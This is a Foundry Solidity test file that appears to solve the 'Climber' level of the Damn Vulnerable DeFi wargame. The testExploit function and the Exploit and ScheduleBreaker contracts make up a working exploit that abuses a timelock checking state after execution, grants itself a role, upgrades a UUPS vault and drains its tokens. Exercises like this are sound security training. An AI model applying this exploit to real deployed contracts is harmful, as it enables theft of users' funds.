// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 internal constant PLAYER_INITIAL_ETH_BALANCE = 1e17;
    uint64 internal constant TIMELOCK_DELAY = 1 hours;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ClimberVault internal vault;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal player;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        player = payable(address(uint160(uint256(keccak256(abi.encodePacked("Player"))))));
        vm.label(player, "Player");
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
        vm.prank(deployer);
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );
        vault = ClimberVault(address(climberVaultProxy));
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assert(vault.owner() != address(0));
        assert(vault.owner() != deployer);

        // Instantiate timelock
        address timelockAddress = vault.owner();
        climberTimelock = ClimberTimelock(payable(timelockAddress));

        // Ensure timelock delay is correct and cannot be changed
        assertEq(climberTimelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(bytes4(keccak256("CallerNotTimelock()")));
        vm.prank(deployer);
        climberTimelock.updateDelay(TIMELOCK_DELAY + 1);

        // Ensure timelock roles are correctly initialized
        assertTrue(climberTimelock.hasRole(keccak256("PROPOSER_ROLE"), proposer));
        assertTrue(climberTimelock.hasRole(keccak256("ADMIN_ROLE"), deployer));
        assertTrue(climberTimelock.hasRole(keccak256("ADMIN_ROLE"), address(climberTimelock)));

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(vault), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(player, player);

        // @note The tip that should make you ask questions is the fact that the execute() function which does external call does not follow Checks-Effects-Interactions Pattern :  https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern. The check : 
        //  if (getOperationState(id) != OperationState.ReadyForExecution) {
        //     revert NotReadyForExecution(id);
        // }
        // is done after the external calls. 
        // So We should ask the question : can we send some external calls inside (re-entrancy) and outside the Timelock contract, reproduce the id and change it's state to ReadyForExecution so that the check afterwards would pass. The answer is yes !
        
        // To resolve this level, we need to drain the proxyVault contract. The only way to do this is to go through the Timelock contract since it is the owner of the proxy. So we can upgrade the implementation to some and execute a delegateCall that transfer funds from the context of the proxy. We can achieve this via the execute() function to execute external calls. 
        // The only issue is that in order to validate the last check, we have to execute the schedule function too.
        // And in order to call schedule() function we need that PROPOSER_ROLE assigned to us (or the attacking contract). This can be achieve via another low level call to the funcion grantRole of the AccessControl contract. So to summarize, we need to call execute() function that makes the following :
        // - Updates the implementation to a new one and delegateCall to it in order to drain the funds.
        // - Call updateDelay to make delay eq to 0 in order for this check else if (block.timestamp < op.readyAtTimestamp) { to not be true and have the execute check be valid. This will allow us to execute tx as soon as it is scheduled.
        // - Update the propose role and give it to the attacking contract that would be calling the function schedule()
        // - Call that attacking contract's function that does a low level call to schedule(). @note We have to use another contract to do a low level call to schedule because doing the schedule() directly inside the execute() will not be possible due to the fact that schedule() expects the exact same calldata as execute() (it would mean that we create a calldata for execute() that contains calldata for calling schedule and both of these are equal which is not possible obviously). We we need to do instead is having the attacking contract construct the calldata which is the same as the one we gave to execute() and that calldata will be used for calling schedule().
        // Enjoy ! 


        address[] memory targets = new address[](4);  
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        bytes32 salt = 0;

        targets[0] = address(climberTimelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(climberTimelock.updateDelay.selector, 0);

        Exploit exploit = new Exploit();
        bytes memory data = abi.encodeWithSelector(exploit.calledByDelegate.selector, dvt, player);
        targets[1] = address(vault);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(vault.upgradeToAndCall.selector, address(exploit), data);

        ScheduleBreaker scheduleBreaker = new ScheduleBreaker(climberTimelock, targets, values, dataElements, salt);
        targets[2] = address(climberTimelock);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(climberTimelock.grantRole.selector, keccak256("PROPOSER_ROLE"), address(scheduleBreaker));
        scheduleBreaker.addElements(targets[2], dataElements[2]);

        targets[3] = address(scheduleBreaker);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(scheduleBreaker.callSchedule.selector);

        climberTimelock.execute(targets, values, dataElements, salt);

        

        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        assertEq(dvt.balanceOf(player), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(vault)), 0);
    }
}



contract Exploit {

    constructor() {
    }

    function calledByDelegate(DamnValuableToken dvt, address player) external {
        dvt.transfer(player, dvt.balanceOf(address(this)));
    }

    function proxiableUUID() external pure returns (bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }
}

contract ScheduleBreaker {

    ClimberTimelock internal immutable climberTimelock;

    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;
    bytes32 public salt;

    constructor(ClimberTimelock _climberTimelock, address[] memory _targets,
        uint256[] memory _values,
        bytes[] memory _dataElements,
        bytes32 _salt) {

        climberTimelock = _climberTimelock;

        targets = _targets;
        values = _values;
        dataElements = _dataElements;
        salt = _salt;
        
    }

    function addElements(address _target, bytes memory dataElement) external {
        targets[2] = _target;
        values[2] = 0;
        dataElements[2] = dataElement;
    }

    function callSchedule() external {
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(this.callSchedule.selector);
        climberTimelock.schedule(targets,
            values,
            dataElements,
            salt);
    }
}